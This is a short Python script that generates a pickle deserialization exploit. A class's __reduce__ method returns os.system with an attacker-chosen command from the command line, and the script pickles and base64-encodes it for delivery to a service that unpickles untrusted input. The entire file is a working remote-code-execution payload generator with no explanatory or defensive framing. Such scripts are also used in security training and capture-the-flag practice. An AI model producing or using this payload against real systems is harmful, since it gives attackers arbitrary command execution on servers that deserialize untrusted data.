import sys
import pickle
import base64

payload = sys.argv[1]

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system, (payload,))

pickled = base64.b64encode(pickle.dumps(PickleRce()))
print(pickled.decode())